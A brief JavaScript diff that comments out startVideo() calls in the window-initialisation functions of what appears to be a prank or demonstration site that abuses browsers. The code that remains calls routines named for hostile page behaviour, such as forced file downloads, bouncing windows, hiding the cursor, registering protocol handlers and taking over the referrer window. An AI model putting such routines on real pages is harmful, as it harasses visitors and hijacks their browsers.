@@ -221,7 +221,7 @@ function initChildWindow () {
   hideCursor()
   moveWindowBounce()
   setupFollowWindow()
-  startVideo()
+ // startVideo()
   detectWindowClose()
   triggerFileDownload()
   speak()
@@ -248,7 +248,7 @@ function initParentWindow () {
   registerProtocolHandlers()
   attemptToTakeoverReferrerWindow()
   hideCursor()
-  startVideo()
+ // startVideo()
   startAlertInterval()
  // superLogout()
  
